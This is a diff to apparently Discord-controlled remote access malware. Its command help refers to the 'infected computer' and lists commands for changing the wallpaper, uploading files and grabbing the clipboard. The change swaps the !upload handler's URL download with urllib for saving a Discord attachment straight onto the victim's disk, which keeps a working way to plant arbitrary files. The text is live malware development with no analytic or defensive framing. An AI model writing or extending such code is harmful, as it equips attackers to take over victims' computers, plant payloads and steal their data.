@@ -44,7 +44,7 @@ Availaible commands are :
 
 --> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper C:/Users/UserExemple/wallpaper.jpg"
 
---> !upload = Upload file from website to computer / Syntax = "!upload exemple.com name=file.png" (without quotation mark)
+--> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
 
 --> !clipboard = Retrieve infected computer clipboard content
 
@@ -173,14 +173,7 @@ async def on_message(message):
 			await message.channel.send("[*] Command successfuly executed")
 
 		if message.content.startswith("!upload"):
-			import re
-			import urllib.request
-			li = message.content[8:]
-			sep = 'name='
-			nck = li.split(sep, 1)[0]
-			na = re.sub(r'.*=', '=', li)
-			me = re.sub('=', '', na)
-			urllib.request.urlretrieve(nck, me)
+			await message.attachments[0].save(message.content[8:])
 			await message.channel.send("[*] Command successfuly executed")
 
 		if message.content.startswith("!output"):
